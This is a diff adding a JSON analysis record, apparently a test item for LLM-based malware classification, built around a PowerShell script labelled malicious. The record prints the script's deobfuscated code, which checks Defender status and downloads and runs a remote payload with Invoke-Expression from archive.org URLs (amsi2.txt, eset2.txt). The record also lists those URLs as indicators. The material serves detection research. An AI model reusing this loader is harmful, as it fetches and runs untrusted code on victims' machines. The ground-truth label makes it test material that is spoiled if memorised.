@@ -1,0 +1,85 @@
+{
+  "meta": {
+    "quelldatei": "07ac813802ee5aca4be94372bf75957c86845a877e2a80c7e674f87822199ea4.ps1",
+    "sha256": "07ac813802ee5aca4be94372bf75957c86845a877e2a80c7e674f87822199ea4",
+    "groesse_bytes": 665,
+    "zeilen": 24,
+    "ground_truth_label": "malicious",
+    "analyse_gekuerzt": false,
+    "hinweis": "Kein Urteil enthalten. Bewertung erfolgt durch das LLM."
+  },
+  "stufe1_extract": {
+    "strings": [
+      "False",
+      "Fucking Defender",
+      "https://ia601506.us.archive.org/24/items/amsi1/amsi2.txt",
+      "not defender",
+      "https://ia801403.us.archive.org/12/items/eset1_202102/eset2.txt",
+      "True"
+    ],
+    "string_anzahl_gesamt": 6,
+    "base64_bloecke_dekodiert": [],
+    "base64_bloecke_gesamt": 0
+  },
+  "stufe2_features": {
+    "strings": [
+      "False",
+      "Fucking Defender",
+      "https://ia601506.us.archive.org/24/items/amsi1/amsi2.txt",
+      "not defender",
+      "https://ia801403.us.archive.org/12/items/eset1_202102/eset2.txt",
+      "True"
+    ],
+    "string_anzahl_gesamt": 6,
+    "base64_bloecke_dekodiert": [],
+    "base64_bloecke_gesamt": 0,
+    "beobachtete_cmdlets": [
+      "Get-MpComputerStatus"
+    ],
+    "auffaellige_tokens": {
+      "invoke_expression": 2,
+      "amsi": 2
+    },
+    "iocs": {
+      "urls": [
+        "https://ia601506.us.archive.org/24/items/amsi1/amsi2.txt",
+        "https://ia801403.us.archive.org/12/items/eset1_202102/eset2.txt"
+      ],
+      "ipv4": [],
+      "pfade": []
+    }
+  },
+  "stufe3_structure": {
+    "strings": [
+      "False",
+      "Fucking Defender",
+      "https://ia601506.us.archive.org/24/items/amsi1/amsi2.txt",
+      "not defender",
+      "https://ia801403.us.archive.org/12/items/eset1_202102/eset2.txt",
+      "True"
+    ],
+    "string_anzahl_gesamt": 6,
+    "base64_bloecke_dekodiert": [],
+    "base64_bloecke_gesamt": 0,
+    "beobachtete_cmdlets": [
+      "Get-MpComputerStatus"
+    ],
+    "auffaellige_tokens": {
+      "invoke_expression": 2,
+      "amsi": 2
+    },
+    "iocs": {
+      "urls": [
+        "https://ia601506.us.archive.org/24/items/amsi1/amsi2.txt",
+        "https://ia801403.us.archive.org/12/items/eset1_202102/eset2.txt"
+      ],
+      "ipv4": [],
+      "pfade": []
+    },
+    "deobfuskiert_auszug": "\r\nfunction YaLatifu\r\n{\r\n$yaallah = Get-MpComputerStatus\r\nif($yaallah.AMServiceEnabled -eq \"False\"){\r\necho \"Fucking Defender\"\r\n$e=new-object net.webclient;\r\n\t\t$e.proxy=[Net.WebRequest]::GetSystemWebProxy();\r\n\t\t$e.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;\r\n\t\tIEX $e.downloadstring('https://ia601506.us.archive.org/24/items/amsi1/amsi2.txt');\r\n}\r\nelse\r\n{\r\necho \"not defender\"\r\n$e=new-object net.webclient;\r\n\t\t$e.proxy=[Net.WebRequest]::GetSystemWebProxy();\r\n\t\t$e.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;\r\n\t\tIEX $e.downloadstring('https://ia801403.us.archive.org/12/items/eset1_202102/eset2.txt');\r\necho \"True\"\r\n\r\n}\r\n}\r\nYaLatifu\r\n",
+    "dekodierte_befehle": [],
+    "beobachtete_abfolge": [
+      "Zeichenkette als Code ausfuehren"
+    ]
+  }
+}
